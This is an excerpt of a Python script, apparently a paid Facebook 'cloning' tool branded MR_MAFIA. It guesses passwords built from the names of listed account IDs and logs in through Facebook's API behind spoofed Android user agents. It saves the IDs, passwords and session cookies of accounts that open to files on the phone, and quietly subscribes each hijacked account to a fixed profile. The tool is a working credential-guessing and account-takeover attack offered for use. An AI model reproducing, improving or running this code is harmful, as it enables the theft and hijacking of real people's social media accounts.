...
an2 = datetime.datetime(2026, 6, 29, 19, 30, 0)
if an > an2 or an == an2:
...
#os.system('clear')
print(' WELCOME TO MR_MAFIA WORLD          ')
...
def UA():
    ...
    b = ";[[FBAN/FB4A;FBAV/456.0.0.0.0;FBBV/769415133;FBDM/{density=1.5,width=2560,height=1920};FBLC/ja_JP;FBRV/456453104;FBCR/LG;FBMF/Xiaomi;FBBD/Nubia;FBPN/com.facebook.katana;FBDV/Samsung_Galaxy_A52;FBSV/11;FBOP/8;FBCA/x86_64;]"
    ...
    k = ";[Dalvik/2.1.0 (Linux; U; Android 9; E5663 Build/TP1A.110915.063) [FBAN/FB4A;FBAV/146.0.0.53.92;FBBV/75931115;FBDM/{density=2.375,width=444,height=1842};FBLC/en_CA;FBRV/76077133;FB_FW/2;FBCR/Koodo Mobile;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/E5663;FBSV/9;FBOP/20;FBCA/armeabi-v7a:arm64-v8a;x86_64]"
...
\033[1;32m-----------------------------------------------------
\033[1;37m[–] AUTHOR   : MR_MAFIA 
\033[1;37m[–] FACEBOOK : MR Faysal 
\033[1;37m[–] GITHUB   : MR MAFIA 
\033[1;37m[–] VERSION : 9.0
\033[1;37m[–] SERVICE : PAID
\033[1;37m[–] BEST ALGERIA MR MAFIA 🥺
\033[1;32m-----------------------------------------------------""")
def linex():
        print('-----------------------------------------------------')
#------------------[ system clear ]-------------------#
...
def menu():
                        clear()
                        print('\033[1;37m [1] \033[1;37mFile Cloning\n \033[1;37m[2] \033[1;37mExit ')
                        linex()
                        xd=input('\033[1;37m  CHOOSE : ')
                        if xd in ['1','01']:
                                clear()
                                print('\033[1;32mFILE EXAMPLE : /sdcard/MR_MAFIA.txt')
                                linex()
...
def M_file_1(ids,names,passlist):
                try:
                        ...
                        sys.stdout.write('\r\r\033[1;37m [MR_MAFIA-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
    ...
    'x-fb-http-engine': 'Liger'}
                                ...
                                if 'session_key' in q:
                                        ...
                                        print('\r\r\033[1;32m [MR_MAFIA-OK] '+ids+' [+] '+pas+'\033[1;97m')
                                        ...
                                        if 'y' in pcp:
                                                print('\r\r \033[1;35m[MR_MAFIA-2F😪] '+ids+' [+] '+pas)
                                                open('/sdcard/MR_MAFIA-2F.txt','a').write(ids+'|'+pas+'\n')
                                                twf.append(ids)
                                                break                  
                                elif 'www.facebook.com' in q['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[1;37m [MR_MAFIA-CP] '+ids+' [+] '+pas+'\033[1;97m')
...
def M_file_2(ids,names,passlist):
        try:
                global ok,loop
                #boos = random.choice([P,M,H,K,B,U,O,N])
                sys.stdout.write('\r\r\033[1;37m [MR_MAFIA-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        ...
                                        open('/sdcard/MR_MAFIA-OK.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                                        oks.append(ids)
                                        break
...
def M_file_3(ids,names,passlist):
        try:
                global oks,loop
                #boos = random.choice([P,M,H,K,B,U,O,N])
                sys.stdout.write('\r\r\033[1;37m[MR_MAFIA-M3] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        ...
                                        requests.post('https://graph.facebook.com/'+'833553969/'+'subscribers'+'?access_token='+token)
                                        open('/sdcard/MR_MAFIA_m4_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/MR_MAFIA_iDs_COOKiE_M4.txt','a').write(ids+'|'+pas+'|'+coki+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                                print('\r\r\033[1;31m<[MR_MAFIA-CP]> '+ids+' | '+pas)
                                                open('/sdcard/MR_MAFIA-2F.txt','a').write(ids+'|'+pas+'\n')
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                                print('\r\x1b[1;31m<[MR_MAFIA-CP]> ' + ids + ' | ' + pas + '\x1b[1;97m')
                                                open('/sdcard/MR_MAFIA-CP.txt','a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                        else:
...
def M_file_4(ids,names,passlist):
        try:
                global oks,loop
                #boos = random.choice([P,M,H,K,B,U,O,N])
                sys.stdout.write('\r\r\033[1;37m[MR_MAFIA-M4] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
...
def main_apv():
    ...
    print(logo)
    uuid = str(os.geteuid())
    TOUFIK=('MR_MAFIAx6b7b5c%s85b8n9nfdi%s'%(uuid,uuid))
    print(logo)
    os.system("clear");print(logo)
    print(f" Your Key : \x1b[1;31m"+TOUFIK)
    print('\033[1;34m═════════════════════════════════════════')
    try:
        system = requests.get("https://raw.githubusercontent.com/MR_MAFIAms16/MR_MAFIA/main/approval.txt").text 
        if TOUFIK in system:
            print()
            msg = str(os.geteuid()) 
            time.sleep(1) 
            ...
            print('\033[1;32m[\033[1;31m–\033[1;32m] Notes : MR_MAFIA Tools Can buy in all countries!')
            print('\033[1;34m═════════════════════════════════════════\033[1;97m')
            ...
            os.system("clear")
            print(logo)
            print(f"\033[1;32m[\033[1;31m–\033[1;32m] YOUR KEY : \033[31;1m{MR_MAFIA}")
            ...
            tks = ("Hi MR_MAFIA Sir, I Need To Buy Your MR_MAFIA Tools Version V3/2.2 Premium Please Accept My Key To Premium\n\n Name : "+choice+"\n Key : "+TOUFIK+"\n Buy Select : "+Picchi)
